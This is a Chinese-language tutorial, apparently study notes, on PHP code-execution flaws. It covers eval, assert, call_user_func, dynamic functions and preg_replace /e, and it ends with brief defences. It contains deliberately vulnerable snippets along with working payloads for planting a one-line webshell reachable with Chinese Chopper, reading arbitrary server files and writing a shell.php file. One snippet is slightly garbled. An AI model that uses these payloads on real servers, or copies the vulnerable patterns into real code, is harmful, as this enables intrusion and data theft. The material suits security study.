#### eval()

> ```php
> <?php
> 
> if(isset($_REQUEST['code'])){
> @$str=$_REQUEST['code'];
> 
> eval($str);
> 
> }
> 
> ?>
> ```
>
> ```php
> <?php
> 
> if(isset($_GET['code'])){
> @$str=$_GET['code'];
> 
> eval($str);
> 
> }
> 
> ?>
> ```
>
> 提交变量[?code=phpinfo();]
>
> 我们提交以下参数也是可以的
>
> [?code=${phpinfo()};]
>
> [?code=1;phpinfo();]

#### assert()

> ```php
> <?php
> 
> if(isset($_GET['code'])){
> @$str=$_GET['code'];
> 
> assert($str);
> 
> }
> 
> ?>
> ```
>
> 提交参数 [?code=phpinfo()]

#### call_user_func()

> ```php
> <?php
> 
> if(isset($_GET['fun'])){
> $fun=$_GET['fun'];
> 
> $para=$_GET['para'];
> 
> call_user_func($fun,$para);
> 
> }
> 
> ?>
> ```
>
> 提交参数[?fun=assert&amp;para=phpinfo()]

#### 动态函数$a($b)

> ```php
> <?php
> 
> if(isset($_GET['a'])){
> $a=$_GET['a'];
> 
> $b=$_GET['b'];
> 
> $a($b);
> 
> }
> 
> ?>
> ```
>
> [?a=assert$b=phpinfo()]

#### preg_replace()

> mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &$count]])
>
>  
>
> 这段代码的含义是搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行。典型的代码如下
> 
>
> ```php
> <?php
> 
> if(isset($_GET['code'])){
> @$str=$_GET['code'];
> 
> preg_replace("/
> [(.∗)]
> /e",'\\1',$code);
> 
> }
> 
> ?>
> ```
>
> 匹配$code$中的数据并执行'	'\\\1'表示正则第一次匹配的内容 
>
> 提交参数[?code=[phpinfo()]], phpinfo() 会被执行

#### 以上漏洞利用

##### 获取shell

> 提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接

##### 获取当前文件的绝对路径

> __FILE__ 是PHP 预定义常量，其含义为当前文件的路径。提交代码[?code=print(__FILE__);]

##### 读文件

> 我们可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限
>
> [?code=var_dump(file_get_contents('c:\windows\system32\drivers\etc\hosts'));]

##### 写文件

> 我们可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录。
>
> 提交代码[?code=var_dump(file_put_contents($_POST[1],$_POST[2]));]
>
> 此时需要借助与hackbar 通过post 方式提交参数
>
> **1=shel.php&2=<?php phpinfo()?>**

#### 防御方法

> 1、尽量不要使用eval(不是函数，是语言结构) 等函数
>
> 2、如果使用的话一定要进行严格的过滤
>
> 3、preg_replace 放弃使用/e 修饰符
>
> 4、修改配置文件
>
> disable_functions=assert